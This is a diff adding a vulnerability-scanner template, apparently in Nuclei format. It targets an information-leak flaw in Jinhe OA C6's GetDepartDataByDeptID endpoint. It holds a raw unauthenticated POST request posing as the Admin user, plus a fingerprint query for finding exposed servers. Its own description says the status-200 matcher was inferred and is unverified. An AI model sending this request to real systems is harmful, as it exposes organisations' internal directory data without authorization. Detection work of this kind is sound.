@@ -1,0 +1,52 @@
+id: poc-9044f2aeda588babd951
+info:
+  name: 金和OAC6GetDepartDataByDeptID存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9044f2aeda588babd951927ed61cc54c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9044f2aeda588babd951927ed61cc54c
+    fofa: + hunter`app.name="金和 OA"`
+http:
+- raw:
+  - 'POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Content-Length: 101
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    Content-Type: text/plain;charset=UTF-8
+
+
+    strDeptID=
+
+    strUserId=Admin
+
+    strUserEsp=
+
+    strArchivesId=
+
+    deptIds=
+
+    IsShowChildrenDept=0
+
+    IsCascade=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
